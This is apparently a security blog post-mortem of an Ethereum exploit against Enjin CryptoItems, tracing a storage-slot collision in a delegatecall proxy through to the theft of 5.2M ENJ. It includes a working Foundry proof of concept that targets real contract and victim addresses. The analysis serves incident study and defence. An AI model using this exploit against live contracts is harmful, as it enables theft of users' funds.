---
title: "Enjin CryptoItems Attack Analysis: 5.2M ENJ Drained via Storage-Slot Collision in Delegatecall Proxy"
date: 2026-09-02T07:11:00+08:00
draft: false
author: yinhui
categories: ["security"]
tags: ["attack"]
description: "Analysis of the Enjin CryptoItems exploit on Ethereum, where a storage-slot collision in an unverified delegatecall proxy allowed permissionless manager takeover and drained 5.2M ENJ."
---

On Ethereum mainnet at block 25834070, transaction `0xd4a382da03c99ce3084661b913b50b525a4b283f66f510bcf1040152830b2a7e` drained 5,238,353 ENJ (over 53% of the reserve in the Adapter contract) from Enjin's CryptoItems ecosystem. The attacker netted 5,231,353 ENJ while an unintended 7,000 ENJ was routed to a legitimate creator through the protocol's built-in royalty fee logic.

The vulnerability stems from a storage-slot collision between a "Managed" delegatecall proxy template and an independent logic contract routed to by that proxy. Calling an unauthenticated `initialize()` function on the proxy overwrote its pending-manager storage slot, turning a routine backend registration into an immediate, permissionless manager takeover. Once in control, the attacker poisoned the proxy's routing table, deployed per-item adapter shells, hijacked the transfer gateway to reassign high-value items from real holders, and melted them into ENJ backing reserves.

<!--more-->

## 1. System Overview & Architecture

Enjin's CryptoItems platform is an ERC-1155 item economy backed by ENJ. Users can create item categories, mint instances (fungible or non-fungible), trade them, and "melt" them to redeem their underlying ENJ backing.

```
                      +-----------------------------------+
                      |      Platform Adapter (PA)        |
                      |  0xfaaFDc07907ff5120a76b34b731...  |
                      +-----------------+-----------------+
                                        | delegatecall
                                        v
     +---------------------------------------------------------------------+
     |                     CryptoItems Facet Modules                       |
     |                                                                     |
     |  +-----------------------------+   +-----------------------------+  |
     |  |    CryptoItemsAdapters      |   |      CryptoItemsUsers       |  |
     |  | (0x68ee930ea6ad962205f1...) |   | (0x1b73f45892d528379397...) |  |
     |  | - 0x33d332ab (deploy shell) |   | - melt()                    |  |
     |  | - 0x41c1df0e (NFT gateway)  |   +-----------------------------+  |
     |  +-----------------------------+                                    |
     +----------------------------------+----------------------------------+
                                        | staticcall / external call
                                        v
                      +-----------------------------------+
                      |      Adapter / EternalStorage     |
                      |  0x4E643a25a64952895f553f20252...  |
                      |  - Holds 9.85M ENJ reserve        |
                      |  - Item ledger & owner mappings   |
                      |  - Only approved caller: PA       |
                      +-----------------------------------+
```

The system relies on several core contracts:

| Contract | Address | Role |
|---|---|---|
| **Adapter (EternalStorage)** | `0x4E643a25a64952895f553f20252861258727174e` | Holds the item ledger (`mapping_28` for NFT owners) and the backing reserve (9,852,235.68 ENJ before the attack). |
| **Platform Adapter (PA)** | `0xfaaFDc07907ff5120a76b34b731b278c38d6043C` | Central entry point and the *only* approved address allowed to release ENJ from Adapter. Routes calls via `delegatecall` to 9 downstream business facets. |
| **NFT Proxy Template (`NF_TEMPLATE`)** | `0x13fA4b9a6C2F2604C919f96F456e3b50E968b157` | "Managed" 2-step handover proxy used as the implementation template for per-item NFT adapter shells. |
| **FT Proxy Template (`proxy`)** | `0x268c039a3127d3107c014f0dc6c390a53e6db27f` | Symmetrical FT proxy template with the exact same Managed layout. |
| **NFT Wrapper Implementation** | `0x24591e792A404e5BD48AC0F694339D807b02CfD2` | Routed to by `NF_TEMPLATE` for ERC-721 adapter logic and `initialize(uint256)`. |
| **Function Router Manager** | `0x04866013862349a6A19A04C8a1590ea2cF026134` | Routed to by templates for `updateContract(address,string,string)` to modify the `_delegates` routing table. |
| **CryptoItemsAdapters** | `0x68ee930ea6ad962205f1e29ae79bcc3dfa07c837` | Factory module for per-item shells (`0x33d332ab`) and privileged transfer gateway (`0x41c1df0e` for NFTs, `0xf95d7da3` for FTs). |
| **CryptoItemsUsers** | `0x1b73f45892d528379397922e8bf160b8710ee997` | Handles user operations, including `melt(uint256[],uint256[])` to burn items and withdraw ENJ. |
| **ENJ Token** | `0xF629cBd94d3791C9250152BD8dfBDF380E2a3B9c` | Standard ERC20 token held in Adapter's reserves. |

## 2. The Vulnerability: Storage-Slot Collision in Managed Proxy

Both `NF_TEMPLATE` and `proxy` implement a 2-step manager transfer pattern called `Managed`:

```solidity
contract ManagedProxy {
    address private _getManager;                  // slot 0
    address private _acceptManager;               // slot 1
    mapping(bytes4 => address) public delegates;  // slot 2

    event ManagerUpdate(address, address);

    function acceptManager() public {
        require(msg.sender == _acceptManager, "Managed: Sender must be the new manager");
        emit ManagerUpdate(_getManager, _acceptManager);
        _getManager = _acceptManager;
        _acceptManager = address(0);
    }

    function transferManager(address _manager) public {
        require(msg.sender == _getManager, "Managed: only manager");
        require(_getManager != _manager, "Managed: New manager needs to be different");
        _acceptManager = _manager;
    }

    function() external payable {
        address delegate = delegates[msg.sig];
        require(delegate != address(0), "Function does not exist.");
        // delegatecall into delegate
        ...
    }
}
```

In `NF_TEMPLATE`, selector `0xfe4b84df` (`initialize(uint256)`) is routed to `0x24591e792A404e5BD48AC0F694339D807b02CfD2` (the NFT wrapper implementation).

Looking at the decompiled implementation of `0x24591e79`:

```solidity
contract ERC721Adapter {
    // Storage layout in the logic contract:
    // uint256 _ownerOf;                       // STORAGE[0x1] (bytes 0 to 19)
    // uint256 _totalSupply;                   // STORAGE[0x2]
    // mapping(uint256 => address) _getApproved; // STORAGE[0x3]

    function initialize(uint256 _poolId) public {
        require(_totalSupply == 0, "ERCAdapter: Adapter already initialized");
        require(_poolId > 0, "ERCAdapter: _id is 0");

        _totalSupply = _poolId;
        _ownerOf = msg.sender;
    }
}
```

Notice the storage layouts side-by-side during `delegatecall`:

| Slot | `NF_TEMPLATE` (Proxy) | `ERC721Adapter` (Logic) |
|---|---|---|
| `slot 0` | `_getManager` | *(unused)* |
| `slot 1` | `_acceptManager` | `_ownerOf` |
| `slot 2` | `delegates` mapping base (raw value 0) | `_totalSupply` |

When `initialize(1)` is executed via `delegatecall` on `NF_TEMPLATE`:
1. `_totalSupply == 0` reads `slot 2` of `NF_TEMPLATE`. Since `delegates` is a mapping, slot 2 itself stores raw zero. The check `_totalSupply == 0` always passes.
2. `_totalSupply = _poolId` writes `1` into `slot 2`.
3. `_ownerOf = msg.sender` writes `msg.sender` directly into `slot 1`.
4. In `NF_TEMPLATE`, `slot 1` is `_acceptManager`!

Anyone calling `NF_TEMPLATE.initialize(1)` immediately sets `_acceptManager = msg.sender`. At block 25834070, `_acceptManager` held `0xE5cb0C8E160C5aC4669D1dfD689Df01bA9eea3eB` (an in-flight, pending governance transfer). The exploit displaces that pending transfer without any admin intervention.

The caller then invokes `NF_TEMPLATE.acceptManager()`. Since `msg.sender == _acceptManager`, `_getManager` (slot 0) becomes `msg.sender`.

The takeover requires exactly two transactions with zero prior privileges:
```solidity
// Step 1: overwrite slot 1 (_acceptManager)
NF_TEMPLATE.call(abi.encodeWithSelector(0xfe4b84df, uint256(1)));

// Step 2: claim manager role
IManagedProxy(NF_TEMPLATE).acceptManager();
```

The exact same storage-slot collision exists symmetrically on the FT template `proxy` (`0x268c039a3127d3107c014f0dc6c390a53e6db27f`), which routes `initialize(uint256)` to `0x75512f843d8d22593d7256708ef80a22b97baf5e`.

## 3. From Takeover to Loot: Route Poisoning & Gateway Abuse

Becoming the manager of `NF_TEMPLATE` does not hold funds directly. The money sits in Adapter (`0x4E64...`). To convert manager control into ENJ, the attacker chains three mechanisms together.

### Step 1: Route Poisoning via `updateContract`

`NF_TEMPLATE` routes selector `0x61455567` (`updateContract(address,string,string)`) to `0x04866013862349a6A19A04C8a1590ea2cF026134`. This function allows the manager to bind any function signature to an arbitrary implementation:

```solidity
// Attacker deploys MaliciousShellLogic
MaliciousShellLogic attackerLogic = new MaliciousShellLogic();

// Updates NF_TEMPLATE's delegates mapping
NF_TEMPLATE.updateContract(
    address(attackerLogic),
    "drain(address,address,address,uint256);",
    "poison"
);
```

Now, any call with `drain.selector` arriving at `NF_TEMPLATE` is forwarded via `delegatecall` to `MaliciousShellLogic`.

### Step 2: Deploying a Per-Item Adapter Shell

Enjin allows lazy deployment of lightweight per-item proxy contracts ("shells") for any category ID via `CryptoItemsAdapters.0x33d332ab`:

```solidity
PA.call(abi.encodeWithSelector(0x33d332ab, BASE_TYPE_ID, "", uint8(0)));
```

This deployment is **permissionless**. For NFT item categories (where bit 247 is set), the newly created shell sets its implementation (`slot 0`) to `NF_TEMPLATE` and registers `ADAPTER.mapping_25[BASE_TYPE_ID] = shell`.

When someone calls the shell with an unknown function selector, the shell's fallback queries `NF_TEMPLATE.delegates(selector)` and delegatecalls the resulting address.

### Step 3: Re-entering the Transfer Gateway as the Shell

The privileged transfer gateway `0x41c1df0e` inside `CryptoItemsAdapters` is designed to allow registered adapter shells to move NFT instances:

```solidity
function gateway(address operator, address from, address to, uint256 id) external {
    uint256 baseType = id & ~ADDRESS_MASK;
    require(getAdapter(baseType) == msg.sender, "Caller not adapter");
    ...
    // Transfers ownership record in Adapter
    ADAPTER.0x95760fb9(id, from, to);
}
```

The attacker triggers `shell.drain(attacker, victim, attacker, TARGET_INSTANCE_ID)`.
1. The shell does not recognize `drain.selector`.
2. It looks up `NF_TEMPLATE.delegates(drain.selector)`, which returns `MaliciousShellLogic`.
3. The shell `delegatecalls` into `MaliciousShellLogic.drain()`. Inside this call, `address(this)` is `shell`.
4. `MaliciousShellLogic` calls `PA.0x41c1df0e(attacker, victim, attacker, TARGET_INSTANCE_ID)`.
5. Since `msg.sender` is `shell`, the check `getAdapter(baseType) == msg.sender` passes.
6. The target item has `UNBOUND` (bit 252) and `SKIP_ROYALTY` (bit 253) set, skipping royalty fees and bound checks.
7. Adapter writes `mapping_28[TARGET_INSTANCE_ID] = attacker`. The victim's NFT ownership is reassigned to the attacker.

### Step 4: Melting the Stolen NFT for ENJ

With the NFT instance recorded under the attacker's address, the attacker calls standard `melt()` on `PA`:

```solidity
uint256[] memory ids = new uint256[](1);
ids[0] = TARGET_INSTANCE_ID;
uint256[] memory amounts = new uint256[](1);
amounts[0] = 1;

PA.melt(ids, amounts);
```

The melt execution path (`0x1b73f458` -> `0x553f1e22` -> `0x9a67aef2`):
1. Verifies `ownerOfRecord(TARGET_INSTANCE_ID) == msg.sender`.
2. Marks the instance burned by setting owner to `0xdeaddeaddeaddeaddeaddeaddeaddead0000`.
3. Calls `Adapter.0x7843e5dd(attacker, meltValue)`.
4. `Adapter` releases `meltValue` in real ENJ directly from its reserve to the attacker.

The theft ceiling is bounded by the real balance of items in the system. Because the underlying Adapter transfer functions enforce balance checks (`assert(amount <= balance)` / `owner == from`), the attacker cannot mint balance out of thin air. Instead, they scan for existing high-value items, hijack their ownership, and melt them.

## 4. The Real Incident: 6 Targets and 5.23M ENJ

In transaction `0xd4a382da03c99ce3084661b913b50b525a4b283f66f510bcf1040152830b2a7e`, the attacker executed this sequence systematically across 6 item categories:

| Target Category ID (Base Type) | Melt Value per Unit | Units Drained | Total ENJ Extracted |
|---|---|---|---|
| `0x7880000000000a2f...` | 3,000,000 ENJ | 1 | 3,000,000 ENJ |
| `0x7880000000000889...` | 1,155,777 ENJ | 1 | 1,155,777 ENJ |
| `0x788000000000088d...` | 512,221 ENJ | 1 | 512,221 ENJ |
| `0x788000000000088b...` | 10,000 ENJ | 56 | 560,000 ENJ |
| `0x7080000000000305...` | 500 ENJ | 20 | 10,000 ENJ |
| `0x7080000000000780...` | 215 ENJ | 165 | 355 ENJ (partial) |
| **Total** | | | **5,238,353 ENJ** |

The attacker also took defensive measures in the same transaction:
- Took over both `NF_TEMPLATE` and the FT `proxy` symmetrically.
- Poisoned the `initialize` and `acceptManager` selectors on both templates to point to an empty contract, effectively locking the proxy to prevent any competing takeover or admin recovery.
- A built-in creator royalty fee caused 7,000 ENJ to be paid to creator address `0x862E4dc54EceaADa8a2574E0d5D5d730F692466f`, leaving 5,231,353 ENJ collected by the attacker EOA (`0x5ec1BA7892D11059c39557b762a97DD695778Ca5`).

## 5. Reproduction

The following Foundry PoC reproduces the exploit on a mainnet fork at block 25834070 against the single highest-value target (melt value: 3,000,000 ENJ).

### `MaliciousShellLogic.sol`

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

contract MaliciousShellLogic {
    address internal constant PA = 0xfaaFDc07907ff5120a76b34b731b278c38d6043C;

    /// @notice 0x41c1df0e is CryptoItemsAdapters' NFT transfer gateway
    function drain(address operator, address from, address to, uint256 id) external {
        (bool ok, bytes memory ret) = PA.call(
            abi.encodeWithSelector(0x41c1df0e, operator, from, to, id)
        );
        if (!ok) {
            assembly {
                revert(add(ret, 32), mload(ret))
            }
        }
    }
}
```

### `EnjinNftHackPoC.t.sol`

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

import {Test, console2} from "forge-std/Test.sol";
import {MaliciousShellLogic} from "../src/MaliciousShellLogic.sol";

interface IManagedProxy {
    function delegates(bytes4 selector) external view returns (address);
    function getManager() external view returns (address);
    function acceptManager() external;
}

interface IERC20Min {
    function balanceOf(address account) external view returns (uint256);
}

contract EnjinNftHackPoC is Test {
    uint256 internal constant FORK_BLOCK = 25834070;

    address internal constant PA = 0xfaaFDc07907ff5120a76b34b731b278c38d6043C;
    address internal constant ADAPTER = 0x4E643a25a64952895f553f20252861258727174e;
    address internal constant NF_TEMPLATE = 0x13fA4b9a6C2F2604C919f96F456e3b50E968b157;
    address internal constant ENJ = 0xF629cBd94d3791C9250152BD8dfBDF380E2a3B9c;

    // Real 3,000,000 ENJ target item category and real holder
    uint256 internal constant BASE_TYPE_ID =
        0x7880000000000a2f000000000000000000000000000000000000000000000000;
    uint256 internal constant TARGET_INSTANCE_ID =
        0x7880000000000a2f000000000000000000000000000000000000000000000001;
    address internal constant VICTIM = 0x50bF217523dC390B18f31bdb1099eBF937dA1756;
    address internal constant BURN_MARKER = address(0xdeaddeaddeaddeaddeaddeaddeaddead0000);

    bytes4 internal constant SEL_INITIALIZE = 0xfe4b84df;
    bytes4 internal constant SEL_UPDATE_CONTRACT = 0x61455567;
    bytes4 internal constant SEL_DEPLOY_ADAPTER = 0x33d332ab;
    bytes4 internal constant SEL_MELT = 0xf6089e12;

    function setUp() public {
        vm.createSelectFork(vm.envString("ETH_RPC_URL"), FORK_BLOCK);
    }

    function testEnjinNftDrainAndMelt() external {
        address attacker = makeAddr("attacker");

        // Step 1: Storage-slot collision takeover
        vm.prank(attacker);
        (bool okInit,) = NF_TEMPLATE.call(abi.encodeWithSelector(SEL_INITIALIZE, uint256(1)));
        assertTrue(okInit, "initialize failed");

        vm.prank(attacker);
        IManagedProxy(NF_TEMPLATE).acceptManager();
        assertEq(IManagedProxy(NF_TEMPLATE).getManager(), attacker, "Manager takeover failed");

        // Step 2: Route poisoning
        MaliciousShellLogic attackerLogic = new MaliciousShellLogic();
        bytes4 drainSelector = MaliciousShellLogic.drain.selector;

        vm.prank(attacker);
        (bool okUpdate,) = NF_TEMPLATE.call(
            abi.encodeWithSelector(
                SEL_UPDATE_CONTRACT,
                address(attackerLogic),
                "drain(address,address,address,uint256);",
                "poison"
            )
        );
        assertTrue(okUpdate, "updateContract failed");

        // Step 3: Deploy per-item adapter shell
        vm.prank(attacker);
        (bool okDeploy, bytes memory retDeploy) = PA.call(
            abi.encodeWithSelector(SEL_DEPLOY_ADAPTER, BASE_TYPE_ID, "", uint8(0))
        );
        assertTrue(okDeploy, "deploy adapter shell failed");
        address shell = abi.decode(retDeploy, (address));

        // Step 4: Hijack NFT ownership via the shell gateway
        vm.prank(attacker);
        (bool okDrain,) = shell.call(
            abi.encodeWithSelector(drainSelector, attacker, VICTIM, attacker, TARGET_INSTANCE_ID)
        );
        assertTrue(okDrain, "drain failed");

        // Step 5: Melt the stolen NFT into real ENJ
        uint256 attackerEnjBefore = IERC20Min(ENJ).balanceOf(attacker);
        uint256 adapterEnjBefore = IERC20Min(ENJ).balanceOf(ADAPTER);

        uint256[] memory ids = new uint256[](1);
        ids[0] = TARGET_INSTANCE_ID;
        uint256[] memory values = new uint256[](1);
        values[0] = 1;

        vm.prank(attacker);
        (bool okMelt,) = PA.call(abi.encodeWithSelector(SEL_MELT, ids, values));
        assertTrue(okMelt, "melt failed");

        // Assertions: 3,000,000 ENJ transferred out of Adapter reserve to attacker
        assertEq(
            IERC20Min(ENJ).balanceOf(attacker),
            attackerEnjBefore + 3_000_000e18,
            "Attacker did not receive 3M ENJ"
        );
        assertEq(
            IERC20Min(ENJ).balanceOf(ADAPTER),
            adapterEnjBefore - 3_000_000e18,
            "Adapter reserve mismatch"
        );
    }
}
```

Running the test:

```text
$ forge test -vvv
[⠊] Compiling...
No files changed, compilation skipped

Ran 1 test for test/EnjinNftHackPoC.t.sol:EnjinNftHackPoC
[PASS] testEnjinNftDrainAndMelt() (gas: 727662)
Logs:
  == STEP 0: preconditions ==
  NF_TEMPLATE pre-manager  :
  0x1952e45D5bD519DC679Cc459C5fD0Ba46305880c
  NF_TEMPLATE pre-pending  :
  0xE5cb0C8E160C5aC4669D1dfD689Df01bA9eea3eB
  BASE_TYPE_ID flag bits: NF / UNBOUND / SKIP_ROYALTY / NO_MELT_FEE (1=set):
  1
  1
  1
  1
  meltValue per instance   :
  3000000000000000000000000
  victim ENJ pre           :
  0
  ADAPTER ENJ pre          :
  9852235680834846022159376
  == STEP 1: takeover NF_TEMPLATE manager ==
  NF_TEMPLATE manager now  :
  0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e
  == STEP 2: poison delegates table ==
  delegates(drain) now     :
  0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
  == STEP 3: deploy per-id shell ==
  deployed shell           :
  0x005ae6aF58f5a14d6D993E91052E17C23AF14a20
  shell impl slot0         :
  0x13fA4b9a6C2F2604C919f96F456e3b50E968b157
  == STEP 4: drain the instance ==
  owner of record idA now  :
  0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e
  == STEP 5: melt -> ENJ ==
  attacker ENJ after melt  :
  3000000000000000000000000
  ADAPTER ENJ after melt   :
  6852235680834846022159376
  LOOT: 3,000,000 ENJ, paid from the ADAPTER reserve, NFT of VICTIM burned.

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 1.98s (746.87ms CPU time)
```

## 6. Key Takeaways

The fundamental flaw in this architecture is the implicit storage layout assumption across `delegatecall` boundaries. 

1. **Uncoordinated Storage in Delegatecall Proxies:** `NF_TEMPLATE` assumes slot 1 is `_acceptManager` and slot 2 is `delegates`. The implementation `0x24591e79` assumes slot 1 is `_ownerOf` and slot 2 is `_totalSupply`. When two contracts with unrelated storage layouts are combined under `delegatecall`, state writes quietly clobber security-critical access control variables.
2. **Unguarded `initialize()` on Shared Implementations:** `initialize()` lacked any caller verification, assuming it would only be executed once upon standalone contract creation. In a proxy routing context where slot 2 was perpetually zero, the initialization guard was permanently broken.
3. **Cascading Gateway Trust:** The transfer gateway `0x41c1df0e` placed absolute trust in any contract registered in `mapping_25`. Because the adapter shell was a mini-proxy inheriting `NF_TEMPLATE`'s routing table, poisoning the template cascaded into full authorization to move user assets.
